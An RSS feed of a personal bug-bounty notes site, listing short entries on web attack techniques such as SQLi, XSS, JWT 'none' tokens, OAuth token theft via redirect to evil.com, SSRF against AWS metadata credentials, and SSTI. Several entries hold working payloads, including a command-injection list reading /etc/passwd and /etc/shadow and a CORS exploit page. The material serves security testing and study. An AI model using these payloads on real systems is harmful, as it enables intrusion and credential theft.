<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Docs on caon.io</title>
    <link>https://caon.io/docs/</link>
    <description>Recent content in Docs on caon.io</description>
    <generator>Hugo -- gohugo.io</generator><atom:link href="https://caon.io/docs/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title></title>
      <link>https://caon.io/docs/bb/impacts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/bb/impacts/</guid>
      <description>Impacts # SQLi # Attacker can obtain full database access holding private user information and other sensitive data. An attacker can use information gathered in SQLi to login in admin panels and obtain access to private and sensitive information.
XSS # A successful exploitation of a XSS allows an attacker to execute arbitrary JavaScript code in the victim&amp;rsquo;s browser, allowing the attacker to steal cookies, tokens or any other sensitive information.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/403bypass/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/403bypass/</guid>
      <description> 403 Bypass # # https://github.com/laluka/bypass-url-parser python3 bypass-url-parser.py --url target.com # https://github.com/devploit/dontgo403 dontgo403 -u https://example.com </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/auths/jwt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/auths/jwt/</guid>
      <description>JWT # Change algorithm to None # Sometimes APIs don&amp;rsquo;t check for JWT encryption. None algorithm allows an attacker to craft a malicious JWT token to escalate privileges.
B64 None: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
JWT Injection # Sometimes applications reflect data that is stored inside the token, try to create accounts with malicious payloads</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/auths/oauth/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/auths/oauth/</guid>
      <description>OAuth 2 # Grabbing OAuth Token via redirect_uri # Redirect to a controlled domain to get the access token.
https://www.example.com/signin/authorize?[...]&amp;amp;redirect_uri=https://localhost.evil.com OAuth implementations should never whitelist entire domains, only a few URLs so that &amp;ldquo;redirect_uri&amp;rdquo; can’t be pointed to an Open Redirect
Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:
https://www.example.com/admin/oauth/authorize?[...]&amp;amp;scope=a&amp;amp;redirect_uri=https://evil.com Cross-Site Request Forgery # Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/auths/saml/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/auths/saml/</guid>
      <description> SAML # https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf https://docs.google.com/presentation/d/1ngp3Mq8y2h2xwGKqkOhI1ePUQxvXTNO1Xhs1kaBJmqU/edit#slide=id.g14623ab8ca8_0_51 </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/auths/twofa/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/auths/twofa/</guid>
      <description>Two factor Authentication # Bypasses # Response Manipulation (Intercept Response and change it to 200, falses to trues&amp;hellip;) 2FA Code Reusability 2FA Code Leakage in Response Password Reset Disable 2FA CSRF on 2FA Disabling Lack of Brute-Force Protection Clickjacking on 2FA Disabling Page Enabling 2FA doesn&amp;rsquo;t expire Previously active Sessions Bypass 2FA with null or 000000 Direct access to a page, jump 2FA process 2FA code based on timestamp Open ID # acr_values can be manipulated as peeer RFC.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/cachepoisoning/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/cachepoisoning/</guid>
      <description>Cache Poisoning # Check if the server is caching requests. You can tellby looking the headers and looking fot the word &amp;ldquo;HIT&amp;rdquo;.
If application does not have login function: # Add an unknown header value to force the page get 400 cached result
GET /home HTTP/1.1 Host: target.com \: If application has login function: # Login into an account and find a page that returns sensitive information. Add cachable extension (.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/clickjacking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/clickjacking/</guid>
      <description> Clickjacking # Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
A website is vulnerable if:
X-Frame-Options is not set Check header presence with:
https://securityheaders.com/ POC # &amp;lt;iframe src=&amp;#34;https://example.com&amp;#34;&amp;gt; </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/cloud/aws/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/cloud/aws/</guid>
      <description> Amazon AWS # Cognito # AWS Cognito helps to authenticate users using amazon solutions, if identity pool is enabled it is possible to gather a temporary token
https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963
Found secrets? # Use those secrets in aws CLI Collection of privilege escalation by misconfiguration # https://dhiyaneshgeek.github.io/cloud/security/2022/06/23/aws-misconfigurations/ Bucket Decloaker # https://gist.github.com/fransr/a155e5bd7ab11c93923ec8ce788e3368 </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/cloud/azure/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/cloud/azure/</guid>
      <description> Microsoft Azure # azureedge takeover
https://onetrick.io/2019/09/28/subdomain-takeover-for-azure-cdn/ </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/cloud/google/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/cloud/google/</guid>
      <description>Google GCP # Google Identity # Applications can use google identity to manage login, check all endpoints to see if admin only endpoint are public
Hint: deleteAccount and signUp may be gold
Documentation: https://developers.google.com/resources/api-libraries/documentation/identitytoolkit/v3/python/latest/identitytoolkit_v3.relyingparty.html
Misconfigs in Google Identity Google Storage # Check what permissions the bucket has:
https://github.com/RhinoSecurityLabs/GCPBucketBrute
If the site ends in appspot.com, bucket can be accessed in:
https://storage.googleapis.com/&amp;lt;site_url&amp;gt;
Hunting GCP Buckets Firebase # Pyrebase Add a .json to the end of a firebaseio url, it may leak the database.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/cms/drupal/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/cms/drupal/</guid>
      <description>Drupal # Drupal hacking guide droopescan Reverse Shel with admin access Content Discovery # Fuzz in example.com/node/FUZZ to find unmapped pages</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/cms/others/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/cms/others/</guid>
      <description> Joomla # joomscan Magento # magescan </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/cms/wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/cms/wordpress/</guid>
      <description> Wordpress # Analyze WP plugins source code wpscan Check WP IP behind WAF Pro tip To maximize results, configure a key in wpscan. </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/commandinjection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/commandinjection/</guid>
      <description>Command Injection # Command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.
&amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/bin/cat%20/etc/passwd&amp;amp;quot;--&amp;amp;gt; &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/bin/cat%20/etc/shadow&amp;amp;quot;--&amp;amp;gt; &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/usr/bin/id;--&amp;amp;gt; /index.html|id| ;id; ;id ;netstat -a; ;system(&amp;#39;cat%20/etc/passwd&amp;#39;) |id |/usr/bin/id |id| |/usr/bin/id| ||/usr/bin/id| |id; ||/usr/bin/id; ;id| ;|/usr/bin/id| \n/bin/ls -al\n \n/usr/bin/id\n \nid\n \n/usr/bin/id; \nid; \n/usr/bin/id| \nid| ;/usr/bin/id\n ;id\n |usr/bin/id\n |nid\n `id` `/usr/bin/id` a);id a;id a);id; a;id; a);id| a;id| a)|id a|id a)|id; |/bin/ls -al a);/usr/bin/id a;/usr/bin/id a);/usr/bin/id; a;/usr/bin/id; a);/usr/bin/id| a;/usr/bin/id| a)|/usr/bin/id a|/usr/bin/id a)|/usr/bin/id; ;system(&amp;#39;id&amp;#39;) ;system(&amp;#39;/usr/bin/id&amp;#39;) %0Acat%20/etc/passwd %0A/usr/bin/id %0Aid %0A/usr/bin/id%0A %0Aid%0A | id &amp;amp; id ; id %0a id %0a $;/usr/bin/id cat /etc/hosts $(`cat /etc/passwd`) cat /etc/passwd {{ get_user_file(&amp;#34;/etc/passwd&amp;#34;) }} &amp;lt;!</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/cookieattacks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/cookieattacks/</guid>
      <description>Cookie Based Attacls # Cookies Explained # https://cookiepedia.co.uk/
Attacks # Check for PII or sensitive in cookie data Add a very long cookie value, it may ddos the application If cookies hold a serialized object, try insecure deserialization Chain CRLF Injection to add cookies (look for XSS or SQL) Check if session expires on logout Decoding the cookie # If the cookie is using some Base encoding (like Base64) or similar you may be able to decode it, change the content and impersonate arbitrary users</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/cors/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/cors/</guid>
      <description>CORS # # https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC # Simple # &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;CORS PoC Exploit&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;center&amp;gt; &amp;lt;h1&amp;gt;CORS Exploit&amp;lt;br&amp;gt;six2dez&amp;lt;/h1&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;div id=&amp;#34;demo&amp;#34;&amp;gt; &amp;lt;button type=&amp;#34;button&amp;#34; onclick=&amp;#34;cors()&amp;#34;&amp;gt;Exploit&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&amp;#34;demo&amp;#34;).innerHTML = this.responseText; } }; xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;http://&amp;lt;vulnerable-url&amp;gt;&amp;#34;, true); xhttp.withCredentials = true; xhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/center&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Simple with headers # &amp;lt;html&amp;gt; &amp;lt;script&amp;gt; var http = new XMLHttpRequest(); var url = &amp;#39;Url&amp;#39;;//Paste here Url var params = &amp;#39;PostData&amp;#39;;//Paste here POST data http.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/crlf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/crlf/</guid>
      <description> CRLF # Carriage Return Line Feed
Carriage Return = ASCII 13, \r, %0D Line Feed = ASCII 10, \n, %0A
Tools # # https://github.com/dwisiswant0/crlfuzz crlfuzz -u &amp;#34;http://example.com&amp;#34; POC # CRLF to XSS
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/csrf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/csrf/</guid>
      <description>CSRF # Conditions to exploit an useful CSRF # Revelante action (CSRF in logout is a boo) Cookie based session (if JWT you are done here) No unpredictable request parameters How to find # Remove CSRF token from request, replace with random value or blank space Change POST to GET Replace CSRF token with an already used token Bypass regex Get a token by request a call manually Extract the token with XSS or HTMl injection Generate POCs # In burp, click in request &amp;gt; engagement tools &amp;gt; generate CSRF poc URL Description https://pentestbook.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/deserialization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/deserialization/</guid>
      <description> Deseralization # Java # https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/hostheaderinjection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/hostheaderinjection/</guid>
      <description>Host Header Attacks # Typically host header injection are not harmful by themselves, it is necessary a chain of vulnerabilites for it to escalate.
Business Logic flaws Cache poisoning Attack Vectors # Premise: An websites allows an user to remember his passwords by requesting a reset email. Attack vector: An attacker request the reset for an email that the knows the application exists, he intercepts the request and adds a host X-Forwarded-For: evil.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/idor/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/idor/</guid>
      <description>IDOR # Basically try to screw with evertything.
Add parameters into the endpoints # GET /api_v1/messages --&amp;gt; 401 vs GET /api_v1/messages?user_id=victim_uuid --&amp;gt; 200 HTTP Parameter pollution # GET /api_v1/messages?user_id=VICTIM_ID --&amp;gt; 401 Unauthorized GET /api_v1/messages?user_id=ATTACKER_ID&amp;amp;user_id=VICTIM_ID --&amp;gt; 200 OK GET /api_v1/messages?user_id=YOUR_USER_ID[]&amp;amp;user_id=ANOTHER_USERS_ID[] JSON Parameter Pollution: # POST /api/get_profile Content-Type: application/json {“user_id”:&amp;lt;legit_id&amp;gt;,”user_id”:&amp;lt;victim’s_id&amp;gt;} Add .json to the endpoint, if it is built in Ruby! # /user_data/2341 --&amp;gt; 401 Unauthorized /user_data/2341.json --&amp;gt; 200 OK Test on outdated API Versions # /v3/users_data/1234 --&amp;gt; 403 Forbidden /v1/users_data/1234 --&amp;gt; 200 OK Wrap the ID with an array.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/lfi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/lfi/</guid>
      <description>LFI/RFI # # https://github.com/kurobeats/fimap fimap -u &amp;#34;https://example.com?test=&amp;#34; Wget # Sometimes browsers mess around with basic directory traversal sequences, but wget may work:
wget http://[host]/page.php?url=../../../../../../../file.html Tricks # PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help Bypasses # Nesting traversal sequences # ....// ....\/ ..../\ ....\\ URL Encoding # dot %2e forward slash %2f backslash %5c Double URL Encoding # dot %252e forward slash %252f backslash %255c Null Byte # Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/openredirect/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/openredirect/</guid>
      <description>Open Redirect # Often a bug that brings impact when chained.
Using &amp;ldquo;https:&amp;rdquo; to bypass &amp;ldquo;//&amp;rdquo; blacklisted keyword
https:google.com Using &amp;ldquo;//&amp;rdquo; to bypass &amp;ldquo;http&amp;rdquo; blacklisted keyword
//google.com Using /\/ to bypass // blacklisted keyword
\/\/google.com/ /\/google.com/ Using &amp;ldquo;/&amp;quot; to bypass:
/\google.com Using &amp;ldquo;%E3%80%82&amp;rdquo; to bypass &amp;ldquo;.&amp;rdquo; blacklisted character
//google%E3%80%82com Using null byte &amp;ldquo;%00&amp;rdquo; to bypass blacklist filter
//google%00.com Using parameter pollution
?next=whitelisted.com&amp;amp;next=google.com Using &amp;ldquo;@&amp;rdquo; character, browser will redirect to anything after the &amp;ldquo;@&amp;rdquo;</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/other/javascriptfiles/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/other/javascriptfiles/</guid>
      <description>Javascript Files # Linters # JSHint Download # getJS
Download all js files for each site https://github.com/003random/getJS
JSScanner
Download all js files for each site, beautify and run linkfinder: https://github.com/dark-warlord14/JSScanner
JSBeat
Download all js files for each site and beautify: https://github.com/felipecaon/BugBountyStuff/blob/main/scripts/jsbeat.py
Way Back Machine # Premise: Javascript files often gets changed, an attaker may find sensitive stuff in an older version of a JS file that is not alive anymore.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/other/passwordbruteforce/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/other/passwordbruteforce/</guid>
      <description>Password Bruteforcing # Hash identify # # https://github.com/noraj/haiti haiti hash Test for default credentials # # https://github.com/ztgrace/changeme ./changeme.py example.com # https://github.com/x90skysn3k/brutespray See documentation Hydra # Hydra is a command-line tool for online password attacks, such as website login pages and ssh.
General format for website attacks: # hydra -L &amp;lt;username list&amp;gt; -p &amp;lt;password list&amp;gt; [host] http-post-form &amp;#34;&amp;lt;path&amp;gt;:&amp;lt;form parameters&amp;gt;:&amp;lt;failed login message&amp;gt;&amp;#34; Wordpress # Attack WordPress login page with a known username, success parameter S= instead of failure parameter, verbose output:</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/other/uuid/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/other/uuid/</guid>
      <description>UUID # V1 # V1 UUIDs are not that unique, UUIDv1 contains sequences that can be guessed.
Since the first chunks are timestamps, one can bruteforce possibilities in between two known values, guessing the right one.
https://github.com/felipecaon/uuidv1gen</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/other/webtech/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/other/webtech/</guid>
      <description>Web technologies # Adobe AEM # aem-hacker aemscan aem-paths.txt writeup about aem exploitation Adobe Coldfusion # https://www.jomar.fr/posts/2021/basic_recon_to_rce/ API # API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap Apache # Exploit default apache Apache Struts2 # Endpoints with .action, .do, .go are all using struts2 Content-Type: %{#context[&amp;#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;#39;].addHeader(&amp;#39;Added Header&amp;#39;,4*4)}.multipart/form-data Artifactory Hacking # Artifactory Hacking guide ASP.NET/IIS # ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner trace.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/parameterpollution/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/parameterpollution/</guid>
      <description>HTTP Parameter Pollution # When searching for HPP keep in mind some servers handle parameters differently.
Take http://example.com?username=foo&amp;amp;username=bar as an example.
PHP and Apache use the last username occurence. Tomcat uses the first occurence. ASP and IIS uses all occurences A study containing all the servers can be found here: https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf
Social Media Share Links # Often a websites offers its user a feature to share a given page in social media.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/pathtransversal/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/pathtransversal/</guid>
      <description> Path transversal # Char Encoded space %20 / %2f \ %5c % %25 . %2e f %66 e %65 Tricks # %252%66 -&amp;gt; %2f -&amp;gt; /
%252%65 -&amp;gt; %2e -&amp;gt; .
%252f -&amp;gt; %2f -&amp;gt; /
%252e -&amp;gt; %2e -&amp;gt; .
Payloads # ..;/
..%5c
..%2f
../
..\
..%252f
%2e%2e%252f
/
//
///
////
/////
//////
///////
////////
/////////
//////////
Files # env
etc/passwd
Windows/win.ini
Resources # URL https://github.com/GrrrDog/weird_proxies </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/prototypepollution/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/prototypepollution/</guid>
      <description>Prototype Pollution # https://github.com/BlackFan/client-side-prototype-pollution https://github.com/msrkp/PPScan Where to find? # Javascript driven frameworks (Express..) PHP # PHP internally uses parse_str() to parse parameters so it sees the char &amp;ldquo;[&amp;rdquo; &amp;amp; &amp;ldquo;_&amp;rdquo; as the same. PHP by default will use the last param as valid. In cases PHP is running on backend but front end validates the param, we can smuggle fake params to php
example.com?account_id=gust&amp;amp;account[id=admin # Backend would execute guest and frontend admin Talks # https://www.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/rce/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/rce/</guid>
      <description> Remote code execution # How to achieve RCE in known CMSes, frameworks and related # https://github.com/p0dalirius/Awesome-RCE-techniques PHP # ${@print(system(&amp;quot;whoami&amp;quot;))} </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/requestsmuggling/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/requestsmuggling/</guid>
      <description> Request Smuggling # It&amp;rsquo;s far more easier to search for articles explaining this concept.
Tools # HTTP Request Smuggler, Burp extension # https://github.com/defparam/smuggler python3 smuggler.py -u &amp;lt;URL&amp;gt; Articles # https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling https://paper.seebug.org/1049/ https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/ Exploitation # Bring impact by reporting smuggling chained with host injection. Users should make simple request with your injected header. </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/sqli/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/sqli/</guid>
      <description>SQLi # sqlmap # https://github.com/sqlmapproject/sqlmap # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u &amp;#34;http://example.com/index.php?id=1&amp;#34; --data=&amp;#34;username=admin&amp;amp;password=pass&amp;amp;submit=+Login+&amp;#34; --method=POST # get sqlmap -u &amp;#34;http://example.com/index.php?id=1&amp;#34; # with point of injection (*) sqlmap -u &amp;#34;http://example.com/index.php?id=1*-133&amp;amp;debug=true&amp;#34; # risk sqlmap -u &amp;#34;http://example.com/index.php?id=1&amp;#34; --risk=3 --level=5 # headers sqlmap --headers=&amp;#34;HEADER&amp;#34; Temper # The ability to create payloads that can bypass waf
https://github.com/m4ll0k/Atlas Example:
--tamper=&amp;#34;between,randomcase&amp;#34; Tricks # Sometimes sites append an extra (&amp;rsquo;) character in injection.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/ssrf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/ssrf/</guid>
      <description>SSRF # Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.
If the site is hosted in amazon, it is possible to get internal information by requesting the urls:
http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/iam/securty-credentials Another idea is to try and request IP’s that we know that are internal:
10.0.0.0 to 10.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/ssti/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/ssti/</guid>
      <description>SSTI # Tools # # https://github.com/epinna/tplmap tplmap.py -u &amp;#39;http://www.target.com/page?name=John&amp;#39; Python Django/Flask # Detection:
{% if &amp;#39;str&amp;#39; = &amp;#39;str&amp;#39; %} vuln {% endif %} {% debug %} Disclose pages:
{% include &amp;#39;admin/base.html&amp;#39; %} Disclose log table:
{% load log %}{% get_admin_log 10 as log %}{% for e in log %} {{e.user.get_username}} : {{e.user.password}}{% endfor %} ASP/APS.NET/ASPX # % is a key character If &amp;lt;% returns 500, try &amp;lt;%= 7*7 %&amp;gt; Tips # Try to SSTI with the fuzz string provided in cobalt.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/wafbypass/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/wafbypass/</guid>
      <description>WAF Bypass Techniques # Try to find real IP address instead of TLD domain, see IP history websites section
Awesome WAF
How to bypass wafs
# https://github.com/vincentcox/bypass-firewalls-by-DNS-history bash bypass-firewalls-by-DNS-history.sh -d example.com # Tool to fuzz urls for waf bypasses # https://github.com/RedSection/pFuzz # A lot of options, see docs IP history websites # https://whoisrequest.com/history/ https://viewdns.info/iphistory/ https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip https://securitytrails.com/domain/example.com/dns https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/ Quick Techniques # Given domain.com, try to subdomains that reflect the main application but are not protected:</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/workflows/payment/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/workflows/payment/</guid>
      <description> Payment Workflow # </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/xss/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/xss/</guid>
      <description>XSS # # https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe - --skip-bav --skip-mining-all Find reflected parameters that could lead to XSS with Gxss
# https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING Semgrep # Semgrep can be used to detect sink and sources and assist in XSS detection.
Usage # Download javascript files and beautify them (See Javascript), then run semgrep with
semgrep -c xss.yaml scripts/* Hold down!</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/exploitation/xxe/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/exploitation/xxe/</guid>
      <description>XXE # Detection:
# Content type &amp;#34;application/json&amp;#34; or &amp;#34;application/x-www-form-urlencoded&amp;#34; to &amp;#34;applcation/xml&amp;#34;. # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files. # If svg allowed in picture upload, you can inject xml in svgs. # If the web app offers RSS feeds, add your malicious code into the RSS. # Fuzz for /soap api, some applications still running soap apis # If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse Check:</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/asncidr/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/asncidr/</guid>
      <description>ASN # An autonomous system number (ASN) is a unique identifier that allows its autonomous system to exchange routing information with other systems.
The five regional Internet registries are:
African Network Information Center (AFRINIC) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin American and Caribbean Network Information Centre (LACNIC) Réseaux IP Européens Network Coordination Centre (RIPE NCC) Obtaining an ASN (autonomous system number) # By Organization Name # https://asrank.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/dorks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/dorks/</guid>
